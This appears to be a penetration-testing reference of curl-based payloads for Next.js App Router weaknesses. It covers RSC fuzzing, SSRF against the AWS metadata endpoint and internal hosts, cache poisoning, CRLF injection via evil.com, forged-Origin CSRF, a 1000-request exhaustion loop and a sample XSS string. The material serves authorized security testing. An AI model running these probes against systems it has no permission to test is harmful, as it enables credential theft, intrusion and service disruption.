# Next.js App Router Active Testing Payloads

Active attack payloads that exercise vulnerabilities unique to Next.js 16, the React Server Components protocol, the App Router runtime, and the Image Optimizer. For generic OWASP API Top 10 payloads (SQLi, BOLA, JWT confusion, CORS reflection, rate-limit bypass), use `@code-security-review` (`references/TESTING_PHASES.md`) Phases 1–7 instead.

> **Authorization required.** Run these only against systems you own or have explicit written permission to test.

---

## 1. RSC Payload Fuzz (CVE-2025-66478)

Tests **NEXTJS-VULN-001** — checks whether a malformed RSC protocol payload triggers RCE or stack trace disclosure.

**Probe (minimal):**
```bash
# Send a crafted RSC payload to a Server Action endpoint.
# The actual exploit payload is version-specific — here we test for stack trace disclosure.
curl -X POST https://target/ \
    -H "Content-Type: text/x-component" \
    -H "Next-Action: 12345678abcdef" \
    -d '0:{"id":"INVALID","bound":null}' \
    -v
```

**Vulnerable behavior:** 500 response containing stack trace with file paths, internal function names, or — in worst case — arbitrary code execution.
**Patched behavior:** 400 or 404 with a generic error body. On `next >= 16.0.7`, the RSC parser rejects malformed payloads without executing them.

**Post-patch verification:**
```bash
npx next info | rg 'Next.js'   # confirm >= 16.0.7
```

---

## 2. Image Optimizer SSRF

Tests **NEXTJS-VULN-025 / 026** — checks whether the image optimizer can be abused to reach internal networks or AWS metadata.

```bash
# AWS metadata endpoint (169.254.169.254)
curl -sS "https://target/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=16&q=75"

# Loopback
curl -sS "https://target/_next/image?url=http%3A%2F%2F127.0.0.1%3A3000%2Fapi%2Fsecret&w=16&q=75"

# Private network (common internal service)
curl -sS "https://target/_next/image?url=http%3A%2F%2F10.0.0.1%3A8080%2Fadmin&w=16&q=75"

# Wildcard hostname test (if remotePatterns allows *)
curl -sS "https://target/_next/image?url=https%3A%2F%2Fattacker.example%2Fmalicious.png&w=256&q=75"
```

**Vulnerable behavior:** Response contains content from the internal endpoint (metadata, API response, admin page) or the attacker-controlled image is proxied and served.
**Patched behavior:** 400 "url" parameter is not allowed with `dangerouslyAllowLocalIP: false` (or absent) and a strict `remotePatterns` allowlist.

---

## 3. Image Optimizer Cache Poisoning (CVE-2025-57752)

Tests **NEXTJS-VULN-028** — checks whether crafted headers can poison the image cache so one user receives another's image.

```bash
# Request 1: User A requests an image with a crafted Accept header
curl -sS "https://target/_next/image?url=https%3A%2F%2Fcdn.example.com%2Fuser-a-avatar.png&w=128&q=75" \
    -H "Accept: image/avif,image/webp,*/*" \
    -H "Cookie: session=USER_A_TOKEN" \
    -o user_a_response.png

# Request 2: User B requests the SAME image URL (different session)
curl -sS "https://target/_next/image?url=https%3A%2F%2Fcdn.example.com%2Fuser-a-avatar.png&w=128&q=75" \
    -H "Accept: image/webp,*/*" \
    -H "Cookie: session=USER_B_TOKEN" \
    -o user_b_response.png

# Compare — if identical, the image cache did not vary on session
diff user_a_response.png user_b_response.png
```

**Vulnerable behavior:** On `next < 16.0.0`, the cache key does not include all request-varying headers. User B may receive User A's cached response.
**Patched behavior:** On `next >= 16.0.0`, the cache key includes all Vary-relevant headers. The framework fix resolves this.

---

## 4. Proxy `next()` SSRF (CVE-2025-57822 class)

Tests **NEXTJS-VULN-015** — checks whether `proxy.ts` rewrites can be directed to internal services.

```bash
# If proxy.ts reads a header or query param to determine the rewrite target:
curl -sS https://target/api/proxy \
    -H "X-Backend: http://169.254.169.254/latest/meta-data/" \
    -v

# URL-encoded bypass (double encoding)
curl -sS "https://target/api/proxy?dest=http%253A%252F%252F169.254.169.254%252F" -v

# Path confusion with encoded @
curl -sS "https://target/api/proxy?dest=https://target%40169.254.169.254/" -v
```

**Vulnerable behavior:** Response contains AWS metadata or content from the internal service.
**Patched behavior:** 400 or the request is routed to the default handler (not the internal target). All `next()` / `NextResponse.rewrite()` destinations are validated against a hard-coded allowlist.

---

## 5. Server Action CSRF via Origin Forge

Tests whether Next.js rejects cross-origin POST requests to Server Actions. Next.js App Router checks the `Origin` header for POST Server Actions — this test verifies that protection is active.

```bash
# Same-origin (should succeed if authenticated)
curl -X POST https://target/ \
    -H "Origin: https://target" \
    -H "Content-Type: multipart/form-data" \
    -H "Cookie: authjs.session-token=$TOKEN" \
    -H "Next-Action: $ACTION_ID" \
    -F "id=123"

# Cross-origin (should be rejected)
curl -X POST https://target/ \
    -H "Origin: https://attacker.example" \
    -H "Content-Type: multipart/form-data" \
    -H "Cookie: authjs.session-token=$TOKEN" \
    -H "Next-Action: $ACTION_ID" \
    -F "id=123"

# Missing Origin (should be rejected or treated as cross-origin)
curl -X POST https://target/ \
    -H "Content-Type: multipart/form-data" \
    -H "Cookie: authjs.session-token=$TOKEN" \
    -H "Next-Action: $ACTION_ID" \
    -F "id=123"
```

**Vulnerable behavior:** The cross-origin or no-origin request executes the Server Action. This means the framework's Origin check is bypassed or disabled.
**Patched behavior:** Only the same-origin request succeeds; cross-origin and missing-origin requests return 403 or are silently dropped.

---

## 6. Server Action Source Leak

Tests **NEXTJS-VULN-009** — checks whether Server Action function bodies are visible in the RSC payload.

```bash
# Load a page that invokes a Server Action
curl -sS https://target/dashboard \
    -H "Accept: text/x-component" \
    -H "RSC: 1" \
    -H "Cookie: authjs.session-token=$TOKEN" \
    | strings | rg -i '(function|async|await|db\.|prisma\.|password|secret)'
```

Alternatively, in the browser:
1. Open DevTools → Network tab → filter by "RSC" or "text/x-component".
2. Load the page.
3. Inspect the payload for Server Action function bodies, business logic, or secrets.

**Vulnerable behavior:** The RSC payload contains the full function body of the Server Action, including helper calls, pricing logic, or crypto details.
**Patched behavior:** The RSC payload contains only a reference ID for the Server Action, not its source.

---

## 7. `"use cache"` User Data Cross-Contamination

Tests **NEXTJS-VULN-021** — checks whether a cached component leaks one user's data to another.

```bash
# Step 1: Login as User A, request the cached page
curl -sS https://target/dashboard \
    -H "Cookie: authjs.session-token=$USER_A_TOKEN" \
    | rg 'Welcome|user.*name'
# Expected: "Welcome, Alice"

# Step 2: Login as User B, request the SAME path
curl -sS https://target/dashboard \
    -H "Cookie: authjs.session-token=$USER_B_TOKEN" \
    | rg 'Welcome|user.*name'
# Expected: "Welcome, Bob"

# Step 3: Compare — if User B sees "Welcome, Alice", the cache is cross-contaminated
```

**Vulnerable behavior:** User B sees "Welcome, Alice" — the component was cached with User A's data and served to everyone.
**Patched behavior:** Each user sees their own greeting. Either the component is not cached, or the cache key includes a user-scoped `cacheTag`.

---

## 8. Header Injection via `redirect()`

Tests **NEXTJS-VULN-014** — checks whether CRLF characters in the redirect target inject extra headers.

```bash
# CRLF injection attempt
curl -sS -D - "https://target/api/go?to=https://evil.com%0d%0aX-Injected:pwned" \
    | rg -i 'x-injected'

# Double-encoding
curl -sS -D - "https://target/api/go?to=https://evil.com%250d%250aX-Injected:pwned" \
    | rg -i 'x-injected'
```

**Vulnerable behavior:** The response includes an `X-Injected: pwned` header, indicating CRLF characters were not stripped.
**Patched behavior:** The redirect destination is validated to be same-origin, and CRLF characters are stripped or the request is rejected.

---

## 9. `unstable_after` Resource Exhaustion

Tests **NEXTJS-VULN-006** — checks whether repeated `unstable_after` callbacks accumulate and exhaust server resources.

```bash
# Step 1: Get baseline process RSS
curl -sS https://target/api/health | jq '.memoryMB'

# Step 2: Fire 1000 requests to an endpoint that uses unstable_after
for i in $(seq 1 1000); do
    curl -sS -o /dev/null https://target/dashboard &
done
wait

# Step 3: Wait for after-callbacks to accumulate
sleep 30

# Step 4: Get RSS again
curl -sS https://target/api/health | jq '.memoryMB'

# If RSS grew significantly (> 2x baseline), unstable_after callbacks are leaking resources
```

**Vulnerable behavior:** RSS grows linearly with the number of requests and does not decrease after 30 seconds.
**Patched behavior:** RSS returns near baseline within 30 seconds as callbacks complete.

---

## 10. `eslint.ignoreDuringBuilds` Smoke Test

Tests **NEXTJS-VULN-029** — verifies whether the CI pipeline would catch a known-bad pattern.

```bash
# Introduce a known lint violation into the codebase
echo 'eval("test")' >> app/test-lint-violation.ts

# Build the project
npx next build

# Check exit code
echo "Exit code: $?"

# Clean up
git restore app/test-lint-violation.ts
```

**Vulnerable behavior:** `npx next build` exits 0 even though `eval()` is present — the lint-based safety net is disabled.
**Patched behavior:** `npx next build` exits non-zero with a lint error from `eslint-plugin-security`.

---

## 11. Secret Environment Variable in Client Bundle

Tests **NEXTJS-VULN-039** — checks whether server-only secrets are accidentally bundled into client JavaScript.

```bash
# Build the project
npx next build

# Search the client bundle for known secret env var names
rg -r '' 'STRIPE_SECRET|DATABASE_URL|AUTH_SECRET|JWT_SECRET|SENDGRID_API' .next/static/chunks/
# Also check the RSC payload
rg -r '' 'STRIPE_SECRET|DATABASE_URL|AUTH_SECRET|JWT_SECRET|SENDGRID_API' .next/server/
```

Alternatively, in the browser:
1. Open DevTools → Sources → search all files for known secret variable names.
2. Check the `.next/static/` folder in the build output.

**Vulnerable behavior:** Secret values appear in `.next/static/chunks/` files (client-side JavaScript).
**Patched behavior:** No secret values in client bundles. Server-only env vars are only accessible via `process.env` inside Server Components, Server Actions, and Route Handlers.

---

## 12. Proxy Matcher Coverage Test

Tests **NEXTJS-VULN-016** — verifies that the `proxy.ts` matcher covers all protected routes.

```bash
# Step 1: List all Route Handlers and pages under protected paths
find app -name 'route.ts' -o -name 'page.tsx' | sort > all_app_routes.txt

# Step 2: Extract the matcher from proxy.ts
rg -n 'matcher:' proxy.ts

# Step 3: For each protected route, probe without a session
# Example for /admin subtree:
for route in $(cat all_app_routes.txt | rg 'admin'); do
    path=$(echo $route | sed 's|app/||; s|/route\.ts||; s|/page\.tsx||; s|^|/|')
    status=$(curl -sS -o /dev/null -w "%{http_code}" "https://target${path}")
    echo "$path -> $status"
done

# Any 200 response means the route is accessible without auth
```

**Vulnerable behavior:** Protected routes return 200 without a session cookie — the proxy matcher has holes.
**Patched behavior:** All protected routes return 302 (redirect to login) or 401 without a session.

---

## Test Result Recording

For every payload above, record in the security report (Phase 8) the following:

| Field | Example |
| --- | --- |
| Test ID | TEST-001 |
| Linked finding | NEXTJS-003 → NEXTJS-VULN-035 |
| Command | `curl -X POST ... -d '<script>alert(1)</script>'` |
| Expected if vulnerable | "script tag rendered unescaped in HTML" |
| Observed | "script tag rendered as `&lt;script&gt;`" |
| Result | PASS (patched) / FAIL (vulnerable) |
